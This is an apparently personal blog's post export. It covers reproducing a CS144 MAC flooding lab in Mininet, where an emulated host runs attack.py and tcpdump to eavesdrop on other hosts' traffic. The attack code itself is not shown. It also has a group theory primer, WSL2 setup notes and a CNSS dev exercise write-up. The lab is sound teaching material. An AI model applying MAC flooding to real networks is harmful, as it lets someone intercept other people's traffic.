{"posts":[{"title":"MAC Overflow Attack Demo","text":"在没有 MAC 泛洪攻击发生的情况下，Alice ping Bob 的流量通常不会流经 Eve 的端口（除非 Eve 位于 Alice 和 Bob 之间的正常转发路径上）。 这个是十年前的CS144的实验了，这几天看视频的时候想着复现一下。没想到遇到这么多问题，遂记录下来。 Tutorial: http://mininet.org/teaching Setup: https://mininet.org/download 环境配置想在WSL下配Mininet的环境，发现好像内核会有点问题。重新编译内核太麻烦了…貌似只能在VM下搞？ 想着wsl方便拿docker跑下，居然连上总是报一个proxyconnect tcp: dial tcp 127.0.0.1:7897: connect: connection refused的错，搜了下很神奇的解决了。 Mininet VM Installation, easy and recommended. 用 SSH 远程连接一下，给 Mininet 两个网络适配器，一个是NAT的，另一个是host-only的。 Ifconfig 一下，能看到 ip，然后就 ssh -Y mininet@[host-ip]。 X11 forward转发，下载 X server，然后开一下Disable access control那个配置，设置一下环境变量： 环境依赖项配置。 123456sudo apt-get updatesudo apt-get install -y git vim-nox python-setuptools python-all-dev flex bison traceroutecd ~git clone https://huangty@bitbucket.org/huangty/cs144_security.gitcd cs144_securityln -s ~/pox/ 控制器下一步，bash ./config.sh，有点逆天。换一个命令，这个十年前实验太老了，很多依赖都没了。或者说，这个脚本里的很多方法都过时了。 12345#!/bin/bashcd pox_module#sudo python2 setup.py developsudo pip2 install -e . 把 run_pox.sh 改成下面这样：还要有一个符号链接不然找不到 123ln -s $PWD/pox_module/cs144 ./pox/pox/cs144#!/bin/bash./pox/pox.py log.level --DEBUG forwarding.l2_learning openflow.of_01 --port=6653 大概就是那边run.sh跑着，这边控制器一直说连不上，一看是端口问题；呃还有这个cs144的l2_learning貌似也有点问题，都换了。 运行脚本下面run.sh的话，要加一个-E，不然切换到 root 的环境变量就搜不到了。 12345678#!/bin/bashecho &quot;start cs144 buffer bloat experiment&quot;#sudo sysctl -w net.ipv4.tcp_congestion_control=renosudo -E python macoverflow.pyecho &quot;cleaning up...&quot;sudo killall -9 tcpdump pingmn -c &gt; /dev/null 2&gt;&amp;1echo &quot;end&quot; emm，它们这个MAC flood的脚本是python2版本问题：一个是网络拓扑大小写不对，另一个print没括号 123456789101112131415161718 # Create switch and host nodes self.addNode( 'alice', cpu=cpu ) self.addNode( 'bob', cpu=cpu ) self.addNode( 'eve', cpu=cpu ) self.addSwitch('s0') self.addLink('alice', 's0', bw=bw_host) self.addLink('bob', 's0', bw=bw_host) self.addSwitch('s1') self.addLink('s1', 's0', bw=bw_host) self.addLink('eve', 's1', bw=bw_host)def bbnet(): &quot;Create network and run Buffer Bloat experiment&quot; print (&quot;starting mininet ....&quot;) ... print (&quot;Before the attack, Eve tries to do some eavesdropping&quot;) 当然attack.py里也有括号问题，嗯。 总之就是这样就能全部解决了，运行的效果，，大概就是下面这样： 123sudo mn -c sudo lsof -i :6653 sudo kill -9 [PID] 演示这是先清理一下古战场，然后运行./run_pox.sh，This will start the POX network controller, which will emulate the behavior of a L2 learning switch. 打开另一个新的终端，运行./run.sh，嗯非常完美： 记得给eve开两个终端，xterm eve，先给eve开个窃听，tcpdump -n -i eve-eth0，然后alice去ping Bob一下：ping 10.0.0.2，此时 eve 肯定是一无所获。 然后我们eve开始运行python attack.py了！好快的闪： 就可以看到流量流经eve的端口了。 This is the END of the experiment.","link":"/2025/07/14/Demo-MAC-Overflow-Attack/"},{"title":"Group Theory","text":"🧐会数学到底是什么感觉？群论入门。 群是任意数学对象（字母、数字、函数、矩阵等）组成的集合再加上一种运算，满足以下四条性质。 Closure（封闭性）：$a\\circ b=c$。集合中的任意两个元素运算仍在集合中。 Associativity（结合性）：$(a\\circ b)\\circ c=a\\circ (b\\circ c)$。 Indentity/Neutral（单位元/中性元）：$a\\circ e=a$。 Inverse（逆元）：$a\\circ a^{-1}=e$。群中的每个元素都存在逆元。 Integers：整数集$\\mathbb{Z}$上的加法运算构成了一个群。单位元为 0，相反数即为逆元； Rationals：有理数集$\\mathbb{Q}/0$上的乘法运算也构成了一个群。单位元为 1，倒数即为逆元。 你可能意识到有理数集上的加法运算也构成一个群，所以我们有符号$Q^+$和$Q^×$。 一个群中的元素个数称为群的阶，$|Z|=|Q^+|=|Q^×|=\\infty$。 请注意，尽管加法和乘法都具备交换性，但并没有任何 RULE 规定群中的元素必须可交换。 由于——$$e_L\\circ x=x,\\ e_L\\circ e_R=e_R\\ \\ \\ (*);\\x\\circ e_R=x,\\ e_L\\circ e_R=e_L\\ \\ \\ (**);\\\\therefore e_L=e_R\\ \\ \\ \\Box$$ 于是我们证明了Left Identity = Right Identity。$$\\because (a^{-1})^{-1}=e\\circ(a^{-1})^{-1}=a\\circ (a^{-1}\\circ (a^{-1})^{-1})=a\\circ e=a$$ $$\\therefore a^{-1}\\circ a=a^{-1}\\circ (a^{-1})^{-1}=e$$ 于是我们证明了Left Inverse = Right Inverse。 群论中有很多反证法的使用。例如 证明群中的单位元唯一：假设有$e_1$和$e_2$，则$e_1=e_1\\circ e_2=e_2$。 证明群中元素的逆元唯一：假设有$a_1$和$a_2$，则$a_1=(a_2\\circ a)\\circ a_1=a_2\\circ e=a_2$。 Finite GroupCyclic $\\mathbb{Z}_n$表示$n$阶整数循环群，$|\\mathbb{Z}_n|=n$。比如模 6 同余群$|\\mathbb{Z}_6|=6$ 中仅有元素 0，1，2，3，4，5。 Dihedral Group：我们研究的数学对象是正多边形，这里我们选择正六边形。群中的元素是使六边形保持原位的变换空间的不同方法，即“旋转”和“翻转后旋转”。 此时 $|\\mathbb{D}_6|=12$，其中有 0、60、20、180、240、300° 以及翻转后对应的 6 种旋转。所以 $|\\mathbb{D}_n|=2n$。 给顶点涂涂颜色再看看？在六边形里写下字母D？ 我们发现，Dihedral Group 不具备交换性，因为翻转和旋转的顺序决定了六边形的手性。 SubGroup子群是群的一部分，并且其本身恰好是群。 例如：偶数集是整数集的子群，$\\mathbb{D}_6$中的旋转本身也构成一个子群，$\\mathbb{D}_3$也是$\\mathbb{D}_6$的一个子群，而$\\mathbb{Z}_9$中有0、3、6这个子群。 用元素$a$生成一个子群&lt;$a$&gt;：$a,a^2,a^3,…$。这只对有限群有效。比如将偶数群表示为2的生成子群时，我们对负偶数无能为力，为了使其成为子群，需要额外添加单位元和逆元。 在一个无限群中找到一个元素，它的生成子群不需要单位元或逆元。 Coset整数群中，奇数集合可以由偶数群整体平移1得到，我们称这样的集合为陪集。一个群确实算作自身的陪集。 回忆一下$\\mathbb{D}_6$，6个旋转方法构成一个子群，那么旋转后翻转，也就是&lt;旋转&gt;平移一个“翻转”的距离就构成了一个陪集。也可以把&lt;旋转&gt;平移一个旋转的距离，尽管这样做会把旋转子群内的元素打乱。 让我们继续这个游戏！&lt;翻转&gt;所生成的子群只有两个元素，翻转一次和翻转两次，显然翻转两次是中性元（什么也没做）。把翻转子群平移60度，就可以得到一个60度的旋转和一个300度旋转后翻转。 群和它的子群是高度对称的。 Lagrange’s Theorem假设现在有个群，群里存在一个小的子群。子群所衍生出的陪集可以整齐地将整个群划分为大小一样的块。 这里有两点是 容易理解 的： 陪集一定覆盖了整个群：因为无论你想得到哪个元素，只需平移对应的差值即可。 所有的陪集大小相同：平移时显然不会增加元素，那会不会减少呢？假设减少，我们一定可以用逆元把它们平移回去，这样就会凭空增加元素。 下面有一点是不那么显然的：所有的陪集不会相互重合。 假如你平移了一个子群中的元素，由于封闭性，得到的元素一定在子群里。那假如你平移了一个不在子群中的元素，结果会不会出现在子群里呢？ 例如子群中有$a、b$两个元素，而$z$不在子群中，且$z\\circ a=b$，则$z=b\\circ a^{-1}$，因为$b$和$a^{-1}$均在子群里，所以$z$也在子群中，这与假设矛盾！！ 所以我们得到了一个二分论断：一个陪集要么与原来的子群完全不重合，要么它就是子群！ 同理可证此二分论断不仅在子群和陪集间，在陪集和陪集间同样成立。 拉格朗日定理 对于群$G$和它的子群$H$，$H$的阶可以整除$G$的阶。 对于一个素数$p$阶群，它的子群只能拥有1个或p个元素，那么它一定是循环群！！！ o.0 可是拉格朗日（1736—1813）在群论诞生前就…","link":"/2023/10/01/Group%20Theory/"},{"title":"Windows Subsystem for Linux","text":"本文记录了我启动WSL2遇到的各种报错和问题的解决方法。 Windows家庭中文版升级为专业版1. win11家庭版转专业版密钥 2. windows11家庭版升级专业版 按照文章1的步骤，密钥第四个可以，输入后自动重启升级。升级后我的显示密钥无效未激活，在终端中输入文章2第二步的三个命令，查看发现升级成功。 启用或关闭Windows功能中没有Hyper-vWindows 没有 Hyper-V 解决方案 WSL2安装Linux发行版开启 WSL2 安装 Ubuntu 当我一切工作准备就绪，使用wsl --update命令升级到最新版的wsl后，仍然出现了错误。 1Error code: Wsl/Service/CreateVm/HCS/HCS_E_HYPERV_NOT_INSTALLED Google后发现有人遇到了和我同样的问题，onomatopellan的回答“勾选Windows Sandbox选项”帮助了我。 使用 wsl --list --online 命令查找可用发行版名称，并用 wsl --install -d &lt;distribution_name&gt; 安装你喜爱的版本。 移动发行版的安装位置默认情况下 WSL 会安装在 C 盘中，从而占用较大的磁盘空间，可以将其移动到其它位置，例如 D:\\WSL下。 导出到 D 盘中：wsl --export Ubuntu D:\\WSL\\Ubuntu\\ubuntu.tar； 注销并移除 C 盘中的发行版：wsl --unregister Ubuntu； 导入到 D 盘中：wsl --import Ubuntu D:\\WSL\\Ubuntu D:\\WSL\\Ubuntu\\ubuntu.tar。","link":"/2024/07/21/Windows-Subsystem-for-Linux/"},{"title":"CNSS Recruit 2024 Dev wp","text":"“Dev 可以成为你创造万物的途径之一，这将伴随巨大的成就感。” 被Guideline吸引，CNSS 2024年Dev方向的招新题目，记录一下自己的wp。 🥳MAN！作为一名Dev手，学会查找并浏览官方文档是非常重要的能力。本题要求你初步学会使用linux系统自带的一个功能强大的文档：man 。(实际上是manual的英文缩写） 之前没有用过linux？没有关系，来看一下这门课程吧：https://missing-semester-cn.github.io/ CH1首先，你要在电脑上配置一个虚拟环境，这里列出几个方案: 在windows环境下可以使用wsl（比较推荐） 或者可以配置虚拟机 或者有条件可以找一台云服务器或者买另一台实体机。 双系统（步骤比较复杂） 当我们有了linux环境后，不妨在linux环境下使用gcc编译一个自己写的”Hello World!”并运行！ CH2linux有一个很有意思的指令：strace。同时，linux中的指令(command)，系统调用(system call)和库函数(library function) 基本都可以用man 1 [name], man 2 [name] man 3 [name]来了解他们的用法。 假设你在CH1中的程序名为hello。在同目录下运行strace ./hello。结合你看到的man上对strace的阐述，简单解释下运行结果。 In the simplest case strace runs the specified command until it exits. It intercepts and records the system calls which are called by a process and the signals which are received by a process. The name of each system call, its arguments and its return value are printed on standard error or to the file specified with the -o option. 输出展示了程序的执行过程。 execve调用hello_world，传递了PATH、参数和42个环境变量；返回0，成功执行。 brk查询程序数据段末尾位置，返回值是当前内存分配位置，用于管理内存。 mmap为程序分配一块内存，返回分配的内存地址，用于读写操作。 access在检查是否存在ld.so.preload文件，返回错误，没有找到。 openat打开共享库缓存文件，查找程序依赖的共享库；当前程序依赖的libc库被打开，程序返回3。 read、mmap和close表示从库中读取需要的数据。 arch_prctl设置线程本地存储，为多线程环境提供支持。（不懂） set_tid_address和set_robust_list用于线程的初始化、设置线程的标识地址，防止线程被意外中断。（也不懂） mprotect保护内存页面的权限，设置某些内存区域为只读。 （大的要来了）write(1, &quot;hello_world\\n&quot;, 12) = 12，通过write系统调用向文件描述符1即标准输出写入12个字节的字符串。 exit_group顾名思义，结束并正常退出。 +++ exited with 0 +++ CH3运行 man 3 exec。你能写一个运用到了库函数exec的C程序吗？ The exec() family of functions replaces the current process image with a new process image. 写程序调用execve来替换当前的进程。CH2的第一个调用。 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt; //execve所在的头文件extern char **environ; // 引用当前进程的环境变量int main() { // 要执行的程序的路径 char *program = &quot;/bin/ls&quot;; // 参数 char *args[] = {&quot;ls&quot;, NULL}; // 执行 execve 系统调用 if (execve(program, args, environ) == -1) { perror(&quot;execve met problems.&quot;); exit(EXIT_FAILURE); // 使用 EXIT_FAILURE 表示失败退出 } return 0;} 编译和运行这个程序。 12345$ gcc -o execve_exp execve_exp.c$ ./execve_expexecve_exp execve_exp.c hello_world test.c$ lsexecve_exp execve_exp.c hello_world test.c 😶‍🌫️Oop Loop学习c语言的数组部分时，想出了三种遍历二维数组的方法，并想办法测量了这三种方法所使用的时间。”这三种方法都访问了同样数量的数组元素，因此他们所耗费的时间一定是差不多的。“但事情远没有这么简单： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/time.h&gt;#include &lt;fcntl.h&gt;#define UNIT_GAP 1000000.0void M_gettimeofday(struct timeval *tv) { int result = gettimeofday(tv, NULL); if(result != 0) { perror(&quot;gettimeofday st\\n&quot;); exit(1); } return ;}#define ArrSize 15000int arr1[ArrSize][ArrSize];int arr2[ArrSize][ArrSize];int arr3[ArrSize][ArrSize];int main() { /* Evaluate iterating pattern 1 */ struct timeval tv_st; M_gettimeofday(&amp;tv_st); for(int i = 0; i &lt; ArrSize; i++) { for(int j = 0; j &lt; ArrSize; j++) { arr1[i][j] += 1; } } struct timeval tv_ed; M_gettimeofday(&amp;tv_ed); double time_gap1 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); /* Evaluate iterating pattern 2 */ M_gettimeofday(&amp;tv_st); for(int i = 0; i &lt; ArrSize; i++) { for(int j = 0; j &lt; ArrSize; j++) { arr2[j][i] += 1; } } M_gettimeofday(&amp;tv_ed); double time_gap2 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); /* Evaluate iterating pattern 3 */ M_gettimeofday(&amp;tv_st); for(int i = 0; i &lt; ArrSize; i++) { int cap = (ArrSize / 3) * 3; for(int j = 0; j &lt; cap; j+=3) { arr3[i][j] += 1; arr3[i][j + 1] += 1; arr3[i][j + 2] += 1; } for(int j = cap; j &lt; ArrSize; j++) { arr3[i][j] += 1; } } M_gettimeofday(&amp;tv_ed); double time_gap3 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); printf(&quot;time spent for time_gap1: %lf seconds\\n&quot;, time_gap1); printf(&quot;time spent for time_gap2: %lf seconds\\n&quot;, time_gap2); printf(&quot;time spent for time_gap3: %lf seconds\\n&quot;, time_gap3);} 事实上，这三种遍历方式使用的时间有明显的差别。 CH1发现每次程序的运行结果差别都很大，因此需要反复运行程序很多次才能找出不同遍历模式下的时间规律。请你帮他修改程序，让程序的运行结果随机性更小，这样就能找出更加可信的结论了！ 实践出真知，跑一下看看。Oops，感觉1和3的随机性很强，2几乎是最慢的，不过也有少数例外。为了减少随机性，我们可以多次跑代码取平均值。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/time.h&gt;#include &lt;fcntl.h&gt;#define UNIT_GAP 1000000.0#define ArrSize 15000#define NUM_RUNS 5 //运行5次并取平均值void M_gettimeofday(struct timeval *tv) { int result = gettimeofday(tv, NULL); if(result != 0) { perror(&quot;gettimeofday failed\\n&quot;); exit(1); }}int arr1[ArrSize][ArrSize];int arr2[ArrSize][ArrSize];int arr3[ArrSize][ArrSize];int main() { double total_time1 = 0.0, total_time2 = 0.0, total_time3 = 0.0; for(int run = 0; run &lt; NUM_RUNS; run++) { struct timeval tv_st, tv_ed; M_gettimeofday(&amp;tv_st); /* PATTERN 1 */ for(int i = 0; i &lt; ArrSize; i++) { for(int j = 0; j &lt; ArrSize; j++) { arr1[i][j] += 1; } } M_gettimeofday(&amp;tv_ed); double time_gap1 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); total_time1 += time_gap1; M_gettimeofday(&amp;tv_st); /* PATTERN 2 */ for(int i = 0; i &lt; ArrSize; i++) { for(int j = 0; j &lt; ArrSize; j++) { arr2[j][i] += 1; } } M_gettimeofday(&amp;tv_ed); double time_gap2 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); total_time2 += time_gap2; M_gettimeofday(&amp;tv_st); /* PATTERN 3 */ for(int i = 0; i &lt; ArrSize; i++) { int cap = (ArrSize / 3) * 3; for(int j = 0; j &lt; cap; j += 3) { arr3[i][j] += 1; arr3[i][j + 1] += 1; arr3[i][j + 2] += 1; } for(int j = cap; j &lt; ArrSize; j++) { arr3[i][j] += 1; } } M_gettimeofday(&amp;tv_ed); double time_gap3 = (double) (tv_ed.tv_sec - tv_st.tv_sec) + ((double) (tv_ed.tv_usec - tv_st.tv_usec) / UNIT_GAP); total_time3 += time_gap3; } printf(&quot;Average time spent for time_gap1: %lf seconds\\n&quot;, total_time1 / NUM_RUNS); printf(&quot;Average time spent for time_gap2: %lf seconds\\n&quot;, total_time2 / NUM_RUNS); printf(&quot;Average time spent for time_gap3: %lf seconds\\n&quot;, total_time3 / NUM_RUNS); return 0;} 嗯，看起来有规律多了：$2&gt;&gt;1&gt;3$。 CH2试回答不同遍历模式下运行时间的差别，并解释为什么会产生这些差别。 1是行优先遍历，这与C中行主序存储数组的方式一致。根据局部性，CPU可以有效地读取连续的内存块，减少缓存未命中次数，提高访问速度。 而2是列优先遍历，与1相反，这种访问模式导致大量缓存未命中、效率低。 关于原理解释那一部分，只靠cpu缓存其实不太能解释 第三个pattern 耗时比第一个pattern小的问题qwq——Shiver 3则使用了循环展开优化。每次处理三个元素，减少了每次更新迭代的控制开销，在大规模进行数组遍历时，会累积成明显的性能提升。 另外由于数组元素是每三个访问的，更容易预取更多数据到缓存中，进一步减少了缓存未命中的损失。 流水线优化：现代处理器使用流水线技术来提高指令执行的效率。3通过减少循环次数和增加每次循环内处理的数据量，减少了其它分支指令，使处理器流水线更顺畅。这可以减少流水线停顿，从而提高整体执行速度。 分支预测：循环的检查条件变少了，分支预测错误的概率也降低了。 可能存在的向量化优化？编译器可以自动将这种每次操作多个相邻元素转换为SIMD指令。这意味着处理器可以在一个指令周期内对多个数据进行相同的操作，提升运算速度。 连续访问多个元素更有可能保持内存对齐，从而减少额外的内存操作开销。 由于循环体内操作相互独立，处理器可以并行处理多个操作，进一步提升速度。 ♿造轮子 Git 是一个分布式版本控制系统，用于跟踪代码或文件的更改，并支持多人协作开发。 你可以在这里看到git的源代码: https://github.com/git/git Shiver想要在自己的电脑上安装git。 以前，他是通过系统的软件包管理器来安装git的。例如，在ubuntu系统中就可以使用这两行命令来安装git： 12$ sudo apt update$ sudo apt install git 但今天，它想换点新花样。他想要通过源代码来编译git！ git的源代码很多地方都有，这里比较推荐使用github上的代码仓库，并通过git clone下载。（不要吐槽为什么电脑上已经有git了为为什么还要下载git源码） 同时，Shiver还通过修改源代码实现了修改git调用版本信息后的输出。 总的来说，Shiver想要你实现如下的操作： 在自己的电脑上编译 git 程序，并在提交文档中简单阐述自己在编译过程中遇到的问题与自己是怎么解决这些问题的。 修改 git 的源代码，使其在输出版本信息时会有额外的 &lt;-- CNSS --&gt; 提示（你也可以添加自己喜欢的信息）并截图提交。（这可能需要你具有一定的代码阅读能力） Hints： 怎么编译？要不先从文档开始，比如源代码中的README.md，INSTALL文件？ 什么是cmake？ A）编译需要依赖，在GPT的帮助下怒装依赖项。 1sudo apt install -y make libssl-dev libcurl4-gnutls-dev libexpat1-dev gettext B）获取Git的源码并编译Git程序： 1234git clone git@github.com:git/git.gitmake configure./configure --prefix=/usr/local #指定安装路径，防止冲突make C）遇到报错信息： 12345678910/usr/bin/ld: libgit.a(utf8.o): in function `reencode_string_iconv':/home/aununo/CNSS/git/utf8.c:498:(.text+0x10dd): undefined reference to `libiconv'/usr/bin/ld: libgit.a(utf8.o): in function `reencode_string_len':/home/aununo/CNSS/git/utf8.c:593:(.text+0x121d): undefined reference to `libiconv_open'/usr/bin/ld: /home/aununo/CNSS/git/utf8.c:603:(.text+0x1252): undefined reference to `libiconv_close'/usr/bin/ld: /home/aununo/CNSS/git/utf8.c:593:(.text+0x129e): undefined reference to `libiconv_open'/usr/bin/ld: /home/aununo/CNSS/git/utf8.c:603:(.text+0x12c9): undefined reference to `libiconv_close'/usr/bin/ld: /home/aununo/CNSS/git/utf8.c:598:(.text+0x136b): undefined reference to `libiconv_open'collect2: error: ld returned 1 exit statusmake: *** [Makefile:2842: git-daemon] Error 1 大概是说缺少 libiconv 库的引用。libiconv 是一个用于字符编码转换的库，而 Git 在处理字符集转换时依赖于它。我们使用命令 123$ ldconfig -p | grep libiconv #检查libiconv是否成功安装 libiconv_hook.so.1 (libc6,x86-64) =&gt; /lib/x86_64-linux-gnu/libiconv_hook.so.1 libiconv_hook.so (libc6,x86-64) =&gt; /lib/x86_64-linux-gnu/libiconv_hook.so 系统上有 libiconv_hook.so，而不是标准的 libiconv.so。由于 libiconv_hook 并没有提供 libiconv.so 的标准接口，导致了编译和测试时出现错误。创建符号链接： 1sudo ln -s /lib/x86_64-linux-gnu/libiconv_hook.so.1 /lib/x86_64-linux-gnu/libiconv.so.2 让系统中的 libiconv_hook.so 模拟 libiconv.so.2，验证一下： 12345$ ldconfig -p | grep libiconv libiconv_hook.so.1 (libc6,x86-64) =&gt; /lib/x86_64-linux-gnu/libiconv_hook.so.1 libiconv_hook.so (libc6,x86-64) =&gt; /lib/x86_64-linux-gnu/libiconv_hook.so libiconv.so.2 (libc6,x86-64) =&gt; /usr/local/lib/libiconv.so.2 libiconv.so (libc6,x86-64) =&gt; /usr/local/lib/libiconv.so 然后进行make编译成功！再复现一遍。 使用的版本基于 2.46.2，并且在此版本发布后有 628 次提交。 当前版本对应的具体提交哈希是 6258f68c3c。（复现前后面还有个.dirty表示在工作目录中有未提交的更改） Git 的版本信息由 git --version 命令生成，输出git version，下面我们进行查找： 1grep -r &quot;git version&quot; . 把大量输出喂给GPT发现： 123./help.c: * with external projects that rely on the output of &quot;git version&quot;../help.c: strbuf_addf(buf, &quot;git version %s\\n&quot;, git_version_string);./help.c: N_(&quot;git version [--build-options]&quot;), Here it is! 在vscode中查找并编辑help.c文件，修改输出即可。 12strbuf_addf(buf, &quot;git version %s\\n&quot;, git_version_string);=&gt; strbuf_addf(buf, &quot;&lt;-- CNSS --&gt; git version %s I l0v3 Sh1v3r~\\n&quot;, git_version_string); 重新make一下，输出时发现后面多了一个dirty。是修改了help.c却没提交更改的缘故。 可以看到输出&lt;-- CNSS --&gt; git version 2.46.2.628.g6258f68c3c.dirty I l0v3 Sh1v3r~ ⚒️Dig and Dig ssg是一名资深的Minecraft玩家，平时最喜欢的就是在MC的辽阔土地上寻找珍贵的矿石。 CH1从原版到整合包，从我的世界到泰拉瑞亚，ssg挖矿的足迹分布在各个领域。 有一天，他突然好奇想挖挖看 C语言程序，于是他写下了这段代码： 123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int depth;void Dig (int digging) { if (digging &lt; 0) { return ; } int where_are_we; printf(&quot;In depth %d, we are at %p \\n&quot;, (depth - digging), (void *) &amp;where_are_we); Dig(digging - 1);}int main() { printf(&quot;Today we will dig: &quot;); scanf(&quot;%d&quot;, &amp;depth); printf(&quot;Let begin!\\n&quot;); Dig(depth);} 他决定先向下面挖掘 10 个函数的深度，于是他将depth 变量设置为了 10 并得到了这样的结果： Today we will dig: 10Let begin!In depth 0, we are at 0x7fffbc3fea14In depth 1, we are at 0x7fffbc3fe9e4In depth 2, we are at 0x7fffbc3fe9b4In depth 3, we are at 0x7fffbc3fe984In depth 4, we are at 0x7fffbc3fe954In depth 5, we are at 0x7fffbc3fe924In depth 6, we are at 0x7fffbc3fe8f4In depth 7, we are at 0x7fffbc3fe8c4In depth 8, we are at 0x7fffbc3fe894In depth 9, we are at 0x7fffbc3fe864In depth 10, we are at 0x7fffbc3fe834 看起来不错，于是他决定继续向下挖，但不知道为什么，当 depth 足够大时，程序就终止运作了！ 因此 ssg 找到你，想请你帮他解决这些问题： 尝试修改程序，使ssg的这个程序能统计他 总共 能够向下挖掘多少个 Byte。多次运行这个程序，每次能向下挖的Byte是固定的吗？ 运行初始程序看看depth的最大值，发现每次运行得到的最大深度相近但不同。比如： 123456789101112$ ./digToday we will dig: 1000000Let begin!...In depth 174513, we are at 0x7ffcccda07a4[1] 2146 segmentation fault ./dig# ----------------------------------- #In depth 174450, we are at 0x7ffda0d677a4[1] 2165 segmentation fault ./dig# ----------------------------------- #In depth 174576, we are at 0x7ffc72f5f7a4[1] 2688 segmentation fault ./dig 第一次运行，程序在174513处崩溃，而第二次运行在174450处崩溃，操作系统为进程分配的栈空间每次可能会略有不同，因此这些深度值并不完全一致。segmentation fault的段错误发生在程序试图访问未被允许访问的内存区域时。 [1] 是Linux系统为每个后台任务分配的作业号，1表示这是当前会话的第一个后台进程。 2146和2165是进程ID，是系统为每个运行程序分配的唯一标识符。 记录一下初始地址，用where_are_we减初始地址得到所在深度： 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int depth;void *initial_address = NULL;void Dig (int digging) { if (digging &lt; 0) { return ; } int where_are_we; if (initial_address == NULL) { initial_address = &amp;where_are_we; } int current_depth_bytes = abs((char *) initial_address - (char *) &amp;where_are_we); printf(&quot;In depth %d, we are at %p, depth in bytes: %d \\n&quot;, (depth - digging), (void *) &amp;where_are_we, current_depth_bytes); Dig(digging - 1);}int main() { printf(&quot;Today we will dig: &quot;); scanf(&quot;%d&quot;, &amp;depth); printf(&quot;Let begin!\\n&quot;); Dig(depth); return 0;} 运行一下程序： 1234567$ ./digToday we will dig: 100Let begin!In depth 0, we are at 0x7ffdd7afae10, depth in bytes: 0In depth 1, we are at 0x7ffdd7afade0, depth in bytes: 48...In depth 100, we are at 0x7ffdd7af9b50, depth in bytes: 4800 发现每次能向下挖的字节数是固定的48字节。 尝试解释为什么depth足够大时程序会停止运行。 递归深度过深，发生了栈溢出。函数的递归调用会在栈上分配内存，而栈的大小是有限的。当递归深度超出系统分配给程序的栈内存时，程序就会发生栈溢出，从而导致程序崩溃。 尝试解释为什么每次层数的间隔都为 48Byte, 这48Byte里面都包含了些什么？ 函数调用过程中的栈帧结构，说明这个函数中一个栈帧大小为48byte。包含：函数的返回地址，局部变量，函数参数等。 比如将函数内部的局部变量where_are_we类型改为long时，层数间隔会变为64byte。 CH2ssg在挖矿的时候是左右手交替进行的，因此他想记录下自己在挖掘每一层时使用的是左手还是右手，于是他写下了这段代码： 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdbool.h&gt;int depth;char* WhichHand(bool hand) { return hand ? &quot;left hand&quot; : &quot;right hand&quot;;}bool Dig1 (int digging) { if( digging &lt; 0) { return 0; } bool now_hand = !Dig1(digging - 1); printf(&quot;In depth %d, we use %s \\n&quot;, (depth - digging), WhichHand(now_hand)); return now_hand;}bool Dig2 (int digging, bool hand) { if( digging &lt; 0) { return hand; } printf(&quot;In depth %d, we use %s \\n&quot;, (depth - digging), WhichHand(hand)); return Dig2(digging - 1, !hand);}int main() { printf(&quot;Today we will dig: &quot;); scanf(&quot;%d&quot;, &amp;depth); printf(&quot;Let begin!\\n&quot;); Dig1(depth); //Dig2(depth, 0);} Dig1和Dig2是他编写的两个不同版本但是效果相似的函数，看起来运行的不错： Today we will dig: 10Let begin!In depth 10, we use left handIn depth 9, we use right handIn depth 8, we use left handIn depth 7, we use right handIn depth 6, we use left handIn depth 5, we use right handIn depth 4, we use left handIn depth 3, we use right handIn depth 2, we use left handIn depth 1, we use right handIn depth 0, we use left hand 但ssg发现了一个很严重的问题，当他使用 O2 优化(即在gcc编译时添加-O2指令)分别编译运行了两个不同版本的函数后，有一个版本的函数，无论他将深度设置为多大，都可以正常运行！ 他现在想考考你: 哪个版本的函数无论设置多大的深度都可以正常运行？ dig2函数。我们来跑一下： 12345678910111213141516$ gcc -O2 -o dig1 dig1.c #O2优化启用了包括-Wunused-result在内的警告，检查scanf返回值dig1.c: In function ‘main’:dig1.c:34:5: warning: ignoring return value of ‘scanf’ declared with attribute ‘warn_unused_result’ [-Wunused-result] 34 | scanf(&quot;%d&quot;, &amp;depth); |$ ./dig1Today we will dig: 1000000Let begin![1] 1727 segmentation fault ./dig# ----------------------------------- #$ ./dig2Today we will dig: 1000000Let begin!...In depth 999999, we use left handIn depth 1000000, we use right hand 为什么？ dig1函数仍然是使用了普通递归的方式，即使开O2优化编译，栈空间的限制依然存在。 而dig2函数使用尾递归，大多数编译器，比如这里的gcc中，开了O2尾递归可以被优化为普通循环实现，每次递归不需要额外占用栈帧，只需将函数参数改变再调用一次，就不会触发栈溢出。 谈一谈这道题对你在实际项目开发中的启发。 用递归，深度较大时，警惕栈溢出； 合理使用尾递归； 了解编译器和语言的优化能力，有助于提高程序的运行效率； developers应当编写健壮的代码，做好代码测试，关注边界条件。 🧮Primes香肠非常痴迷于筛法求素数表，大致原理如下 于是他先用 JavaScript 编写了下面这样的代码 1234567891011121314151617function* iota(i, n) { while (i &lt; n) yield i++}function* filter(g, p) { for (x of g) { if (x % p) yield x }}g = iota(2, 100)while (true) { var {value, done} = g.next() if (done) break g = filter(g, value) console.log(value)} 程序成功打印了 100 以内的所有素数。 为了让更多人理解这段代码，他又编写了 Python 版本 123456789101112131415161718def iota(i, n): while i &lt; n: yield i i += 1def filter(g, p): for x in g: if x % p: yield xg = iota(2, 100)try: while 